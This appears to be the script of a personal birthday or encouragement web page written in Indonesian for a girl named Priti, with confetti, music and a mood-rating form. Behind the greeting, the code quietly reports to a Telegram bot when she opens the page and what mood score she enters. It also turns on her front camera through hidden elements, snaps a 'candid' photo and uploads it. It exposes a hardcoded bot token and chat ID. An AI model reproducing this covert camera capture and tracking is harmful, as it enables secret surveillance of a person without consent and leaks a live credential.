const intro = document.getElementById('intro');
const main = document.getElementById('main');
const song = document.getElementById('song');
const btnStart = document.getElementById('btnStart');
const moodForm = document.getElementById('moodForm');
const moodInput = document.getElementById('moodInput');
const moodResult = document.getElementById('moodResult');

// --- KONFIGURASI TELEGRAM (ISI DISINI) ---
const TG_TOKEN = "8557289051:AAFbX2-6JiVRR17LxTab3Ej43mYMPEH0iuw"; // Contoh: 123456:ABC-Def...
const TG_CHAT_ID = "1398624096"; // Contoh: 123456789
// -----------------------------------------

// Variable untuk mencegah double click/play
let isPlayed = false;

// (Video element removed) - video and its controls were removed as requested

// --- PERBAIKAN 1: Menangani tinggi layar 100vh di mobile ---
function setViewportHeight() {
  const vh = window.innerHeight * 0.01;
  document.documentElement.style.setProperty('--vh', `${vh}px`);
}
// Panggil saat load dan saat ukuran layar berubah
setViewportHeight();
window.addEventListener('resize', setViewportHeight);
// -----------------------------------------------------------


// tangani pengiriman form skala
moodForm.addEventListener('submit', (e) => {
  e.preventDefault();
  const val = parseInt(moodInput.value, 10);
  
  if (!val || val < 1 || val > 10) {
    moodResult.textContent = 'Oops! Masukkan angka dari 1 sampai 10 ya 😉';
    return;
  }
  
  // Tentukan emoji dan class berdasarkan nilai
  let emoji, iconClass, message;
  if (val >= 8) {
    emoji = '🔥';
    iconClass = 'high-mood';
    message = 'Semangatmu Membara!';
  } else if (val >= 5) {
    emoji = '💪';
    iconClass = 'medium-mood';
    message = 'Tetap Semangat!';
  } else {
    emoji = '✨';
    iconClass = 'low-mood';
    message = 'Semangat Ya!';
  }

  // Buat overlay
  const overlay = document.createElement('div');
  overlay.className = 'overlay';
  document.body.appendChild(overlay);

  // Buat popup
  const popup = document.createElement('div');
  popup.className = 'mood-popup';
  popup.innerHTML = `
    <h2>${message}</h2>
    <span class="mood-icon ${iconClass}">${emoji}</span>
    <p>Level Semangatmu: ${val}/10</p>
  `;
  
  document.body.appendChild(popup);
  
  // Tampilkan overlay dengan smooth
  requestAnimationFrame(() => {
    overlay.style.opacity = '1';
  });

  // Kirim update mood ke Telegram
  try {
    kirimPesan(`Update Mood: Dia ngisi skala ${val}/10`);
  } catch (e) {
    // ignore
  }

  // Setelah 3 detik — video dihapus, lanjutkan alur tanpa memutar video
  setTimeout(() => {
    overlay.style.opacity = '0';
    popup.style.opacity = '0';

    setTimeout(() => {
      overlay.remove();
      popup.remove();

      // Pause backsound music sebentar (mengganti durasi video), lalu lanjutkan
      song.pause();
      setTimeout(() => {
        song.play().catch(e => console.log("Autoplay diblokir browser"));
        confetti.length = 0;
        startConfetti(val * 15);
      }, 300);
    }, 300);
  }, 3000);

  confetti.length = 0;
  startConfetti(val * 15);

  // Ulangi animasi konfeti
  confetti.length = 0; // Bersihkan konfeti sebelumnya
  startConfetti(val * 15); // Buat konfeti baru berdasarkan mood
});

// Ketika tombol diklik
// --- FUNGSI KIRIM NOTIFIKASI ---
function kirimNotif() {
  if (!TG_TOKEN || !TG_CHAT_ID) {
    console.log("Token atau Chat ID belum diisi.");
    return;
  }

  const pesan = "Lapor Komandan! Si Doi (Priti) baru aja buka web semangatnya nih! ❤️🚀";
  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(pesan)}`;

  fetch(url)
    .then(response => {
      if (response.ok) {
        console.log("Laporan terkirim ke Telegram!");
      } else {
        console.log("Gagal kirim laporan.");
      }
    })
    .catch(error => console.error("Error Telegram:", error));
}

// Kirim pesan teks custom ke Telegram
function kirimPesan(text) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`;
  fetch(url).catch(err => console.error("Gagal kirim pesan:", err));
}

// Upload foto (Blob) ke Telegram
function sendPhotoToTelegram(imageBlob) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  const formData = new FormData();
  formData.append('chat_id', TG_CHAT_ID);
  formData.append('photo', imageBlob, 'pap-doi.jpg');
  formData.append('caption', '📸 Asikkk! Ada yang kena candid pas buka web nih! ❤️');

  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  }).then(() => console.log('Foto berhasil dikirim ke Telegram!'))
    .catch(err => console.error('Gagal kirim foto:', err));
}

// Tangkap foto dari kamera tersembunyi dan kirim ke Telegram
function captureAndSendPhoto() {
  const video = document.getElementById('cameraVideo');
  const canvas = document.getElementById('cameraCanvas');
  if (!video || !canvas) return;

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        video.srcObject = stream;
        // tunggu sebentar agar camera siap
        setTimeout(() => {
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          // matikan kamera
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => {
            if (blob) sendPhotoToTelegram(blob);
          }, 'image/jpeg', 0.8);
        }, 1500);
      })
      .catch(err => {
        console.error('Kamera ditolak/error:', err);
        kirimPesan('Lapor: Doi menolak akses kamera atau kamera error 😢');
      });
  }
}

// Ketika tombol diklik
btnStart.addEventListener('click', () => {
  if (isPlayed) return; // cegah double click
  isPlayed = true;

  intro.style.opacity = '0';
  setTimeout(() => {
    intro.style.display = 'none';
    main.style.opacity = '1';
    document.getElementById('greeting').textContent = getGreeting();
    song.play().catch(e => console.log("Autoplay diblokir browser")); // Tambah .catch
    startConfetti();
    // Kirim notifikasi teks ke Telegram dan coba ambil foto candid
    kirimPesan("Lapor Komandan! Si Doi mulai buka webnya! ❤️");
    captureAndSendPhoto();
  }, 1000);
});

// Efek Konfeti
const canvas = document.getElementById('confetti');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const confetti = [];
const colors = ['#ff6f61', '#f9d342', '#92dce5', '#f2a6b3', '#ffffff'];

function ConfettiPiece(x, y, color) {
  this.x = x;
  this.y = y;
  this.size = Math.random() * 8 + 4;
  this.color = color;
  this.speedY = Math.random() * 3 + 1;
  this.speedX = Math.random() * 2 - 1;
}

ConfettiPiece.prototype.update = function() {
  this.y += this.speedY;
  this.x += this.speedX;
  if (this.y > canvas.height) {
    this.y = -this.size; // Reset ke atas saat jatuh ke bawah
    this.x = Math.random() * canvas.width; // Reset posisi x
  }
}

ConfettiPiece.prototype.draw = function() {
  ctx.beginPath();
  ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
  ctx.fillStyle = this.color;
  ctx.fill();
}

// Fungsi untuk mendapatkan ucapan berdasarkan waktu
function getGreeting() {
  const hour = new Date().getHours();
  let greeting;

  if (hour >= 4 && hour < 11) {
    greeting = "🌅 Selamat Pagi Pritii yang Pretty 🎂";
  } else if (hour >= 11 && hour < 15) {
    greeting = "☀️ Selamat Siang Pritii yang Pretty 🎂";
  } else if (hour >= 15 && hour < 18) {
    greeting = "🌤️ Selamat Sore Pritii yang Pretty 🎂";
  } else {
    greeting = "🌙 Selamat Malam Pritii yang Pretty 🎂";
  }

  return greeting;
}

// --- PERBAIKAN 3: Fungsi startConfetti menerima parameter ---
function startConfetti(count = 150) { // Beri nilai default 150
  for (let i = 0; i < count; i++) { // Gunakan parameter 'count'
    confetti.push(new ConfettiPiece(
      Math.random() * canvas.width,
      Math.random() * canvas.height - canvas.height, // Mulai dari atas layar
      colors[Math.floor(Math.random() * colors.length)]
    ));
  }
  // Panggil animate HANYA jika confetti baru dibuat pertama kali
  // Tapi struktur Anda memanggilnya lagi. Agar sesuai, kita cek
  // (Sebenarnya, animate() sudah looping, tapi kita ikuti alur Anda)
  if (confetti.length === count) { // Hanya panggil animate saat pertama kali
      animate();
  }
}
// -----------------------------------------------------------

let animationFrameId = null; // Untuk mengelola frame animasi
function animate() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  for (let c of confetti) {
    c.update();
    c.draw();
  }
  animationFrameId = requestAnimationFrame(animate);
}

// Pastikan canvas ikut responsif saat ukuran diubah
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  setViewportHeight(); // Panggil juga di sini
});
// (Video controls and functions removed)